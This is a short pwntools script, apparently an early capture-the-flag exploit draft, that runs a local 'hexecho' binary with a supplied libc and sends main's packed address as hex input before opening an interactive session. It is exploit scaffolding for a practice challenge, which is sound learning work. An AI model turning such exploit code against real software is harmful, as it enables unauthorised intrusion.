from pwn import *

elf = ELF('./hexecho')
io = process('./hexecho', env={'LD_PRELOAD': './libc.so.6'})

log.info('main: ' + hex(elf.symbols['main']))
log.info(p64(elf.symbols['main']))

size = 4
io.sendlineafter('Size: ', str(size))
io.sendlineafter('Data (hex): ', p64(elf.symbols['main']))

io.interactive()
